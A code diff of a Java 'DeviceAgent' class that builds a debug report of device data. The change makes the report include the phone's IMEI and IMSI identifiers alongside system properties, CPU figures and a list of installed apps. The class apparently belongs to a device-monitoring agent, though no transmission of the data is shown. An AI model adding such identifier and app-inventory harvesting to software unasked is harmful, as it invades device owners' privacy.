@@ -104,14 +104,15 @@ public class DeviceAgent extends AgentBase {
 		final StringBuffer sb = new StringBuffer();
 		sb.append("Debug\n");
 		sb.append("-- SYSTEM --\r\n");
-		sb.append("Id: " + Device.self().getDeviceId() + "\n");
+		sb.append("IMEI: " + Device.self().getImei() + "\n");
+		sb.append("IMSI: " + Device.self().getImsi() + "\n");
 		sb.append("cpuUsage: " + cpuUsage + "\n");
 		sb.append("cpuTotal: " + cpuTotal + "\n");
 		sb.append("cpuIdle: " + cpuIdle + "\n");
 
 		sb.append("-- PROPERTIES --\r\n");
-		final Iterator<Entry<Object, Object>> it = properties.entrySet()
-				.iterator();
+		final Iterator<Entry<Object, Object>> it = properties.entrySet().iterator();
+		
 		while (it.hasNext()) {
 			final Entry<Object, Object> pairs = it.next();
 			sb.append(pairs.getKey() + " : " + pairs.getValue() + "\n");
@@ -119,11 +120,10 @@ public class DeviceAgent extends AgentBase {
 
 		if (processList == 1) {
 			final ArrayList<PInfo> apps = getInstalledApps(false); /*
-																	 * false =
-																	 * no system
-																	 * packages
+																	 * false = no system packages
 																	 */
 			final int max = apps.size();
+			
 			for (int i = 0; i < max; i++) {
 				sb.append(apps.get(i) + "\n");
 
